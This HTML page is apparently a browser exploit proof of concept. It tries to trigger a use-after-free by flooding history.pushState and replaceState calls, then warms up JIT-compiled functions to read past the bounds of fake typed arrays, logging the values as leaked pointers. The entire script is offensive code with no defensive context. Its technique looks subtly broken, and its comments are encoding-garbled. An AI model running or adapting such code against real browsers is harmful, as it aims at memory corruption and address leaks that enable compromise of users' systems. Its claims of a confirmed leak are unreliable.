<!DOCTYPE html>
<html>
<head><title>JIT Info Leak</title></head>
<body>
<button onclick="test()">Test JIT Leak</button>
<pre id="log"></pre>

<script>
const logEl = document.getElementById("log");
function log(m) { logEl.textContent += m + "\n"; }

const BASE = 977, STEP = 14461, UAF_ITERS = 48;

async function triggerUAF() {
  let size = BASE;
  for(let i=0; i<UAF_ITERS; i++){
    history.pushState({index:i}, "", "#" + "E".repeat(size));
    history.replaceState({index:i}, "", "#" + "E".repeat(size >> 1));
    if(i % 6 === 0) setTimeout(()=>history.back(), 0);
    size += STEP;
    await new Promise(r=>setTimeout(r,5));
  }
  await new Promise(r=>setTimeout(r,200));
}

async function test() {
  log("=== JIT INFO LEAK ===\n");
  
  await triggerUAF();
  
  window.addEventListener('popstate', (e) => {
    if(e.state && e.state.index >= 40) {
      log("[RACE] Testing JIT info leak...\n");
      
      // Fun√ß√£o JIT
      function jit_read(arr, idx) {
        return arr[idx];
      }
      
      // Warm up
      const warm = new Uint32Array(100);
      for(let i=0; i<10000; i++) {
        jit_read(warm, i % 100);
      }
      
      log("JIT compiled\n");
      
      // CRITICAL: Fake array para ler al√©m
      const fake = {
        0: 0, 1: 0, 2: 0, 3: 0,
        length: 0x10000  // Huge fake length
      };
      fake.__proto__ = Uint32Array.prototype;
      
      log("Fake array with length: " + fake.length);
      log("Reading beyond bounds:\n");
      
      // Ler 100 valores al√©m do objeto
      const leaked = [];
      
      for(let i=4; i<100; i++) {
        try {
          const val = jit_read(fake, i);
          
          if(val !== undefined && val !== 0) {
            leaked.push({ index: i, value: val });
            log(`  [${i}] = 0x${val.toString(16).padStart(8, '0')}`);
          }
        } catch(e) {}
      }
      
      log("\n" + "=".repeat(60));
      log("LEAKED VALUES: " + leaked.length);
      
      if(leaked.length > 0) {
        log("\nüö® INFO LEAK CONFIRMED! üö®");
        log("\nPotential pointers/addresses:");
        
        leaked.forEach(item => {
          // Valores grandes podem ser ponteiros
          if(item.value > 0x10000000) {
            log(`  Index ${item.index}: 0x${item.value.toString(16)} (possible pointer!)`);
          }
        });
      }
      
      // BONUS: Tentar leak via Float64Array
      log("\n" + "=".repeat(60));
      log("FLOAT64 INTERPRETATION:\n");
      
      function jit_read_float(arr, idx) {
        return arr[idx];
      }
      
      // Warm up Float64
      const warmFloat = new Float64Array(100);
      for(let i=0; i<10000; i++) {
        jit_read_float(warmFloat, i % 100);
      }
      
      const fakeFloat = {
        0: 0, 1: 0, 2: 0, 3: 0,
        length: 0x1000
      };
      fakeFloat.__proto__ = Float64Array.prototype;
      
      log("Reading as Float64 (pointer leak):\n");
      
      for(let i=4; i<50; i++) {
        try {
          const val = jit_read_float(fakeFloat, i);
          
          if(val !== undefined && !isNaN(val) && val !== 0) {
            // Convert float to hex (pointer representation)
            const buffer = new ArrayBuffer(8);
            const floatView = new Float64Array(buffer);
            const intView = new Uint32Array(buffer);
            
            floatView[0] = val;
            const low = intView[0];
            const high = intView[1];
            
            if(high !== 0) {  // Likely a pointer
              log(`  [${i}] Float: ${val}`);
              log(`       Hex: 0x${high.toString(16).padStart(8,'0')}${low.toString(16).padStart(8,'0')}`);
            }
          }
        } catch(e) {}
      }
    }
  });
  
  for(let i=0; i<15; i++) {
    history.back();
    await new Promise(r=>setTimeout(r,40));
  }
}
</script>
</body>
</html>
